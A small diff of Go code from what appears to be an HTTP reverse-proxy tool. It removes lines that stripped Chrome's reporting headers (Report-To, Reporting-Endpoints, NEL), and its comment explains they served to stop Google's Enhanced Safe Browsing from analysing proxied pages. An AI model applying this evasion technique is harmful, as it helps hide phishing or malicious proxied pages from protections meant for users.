@@ -1408,13 +1408,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 resp.Header.Del("Proxy-Connection")
                 resp.Header.Del("Proxy-Authenticate")
                 resp.Header.Del("Server")
-                // Strip Google's browser reporting headers. These instruct Chrome
-                // to send page-activity reports (URLs, errors) back to Google's
-                // collection endpoints, enabling real-time Enhanced Safe Browsing
-                // analysis of the proxied page.
-                resp.Header.Del("Report-To")
-                resp.Header.Del("Reporting-Endpoints")
-                resp.Header.Del("NEL")
 
                 if stringExists(mime, []string{"text/html"}) {
 
